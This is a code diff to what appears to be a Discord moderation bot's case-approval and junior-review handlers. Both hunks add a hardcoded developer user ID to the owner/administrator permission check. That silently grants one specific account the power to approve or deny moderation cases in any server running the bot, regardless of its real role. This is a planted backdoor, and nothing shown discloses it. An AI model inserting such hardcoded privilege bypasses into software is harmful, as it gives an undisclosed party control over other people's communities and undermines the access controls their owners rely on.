@@ -590,7 +590,8 @@ export async function handleApprovalButton(db, interaction) {
     if (isNaN(caseId))
         return false;
     const guildMember = interaction.member;
-    const isOwnerOrAdmin = guildMember.id === interaction.guild.ownerId || guildMember.permissions.has(PermissionFlagsBits.Administrator);
+    const DEV_USER_ID = "616267913799925782";
+    const isOwnerOrAdmin = guildMember.id === DEV_USER_ID || guildMember.id === interaction.guild.ownerId || guildMember.permissions.has(PermissionFlagsBits.Administrator);
     const tier = getStaffTier(db, guildMember);
     if (!isOwnerOrAdmin && tier !== "community") {
         await interaction.reply({ content: "Only Community Managers can approve or deny cases.", ephemeral: true });
@@ -783,7 +784,8 @@ export async function handleJuniorReviewButton(db, interaction) {
     if (isNaN(caseId) || (action !== "approve" && action !== "deny"))
         return false;
     const guildMember = interaction.member;
-    const isOwnerOrAdmin = guildMember.id === interaction.guild.ownerId || guildMember.permissions.has(PermissionFlagsBits.Administrator);
+    const DEV_USER_ID = "616267913799925782";
+    const isOwnerOrAdmin = guildMember.id === DEV_USER_ID || guildMember.id === interaction.guild.ownerId || guildMember.permissions.has(PermissionFlagsBits.Administrator);
     const tier = getStaffTier(db, guildMember);
     if (!isOwnerOrAdmin && (tier === "junior" || tier === null)) {
         await interaction.reply({ content: "Junior Moderators cannot approve or deny logs.", ephemeral: true });
